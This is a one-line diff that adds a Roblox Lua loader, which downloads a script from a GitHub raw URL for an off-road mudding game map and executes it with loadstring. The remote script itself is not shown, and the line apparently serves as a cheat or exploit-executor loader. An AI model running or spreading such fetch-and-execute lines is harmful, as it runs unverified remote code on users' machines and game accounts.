@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/map-southern-mudding-offroading-spam3-lfzo6yumo9ac5v.lua"))()
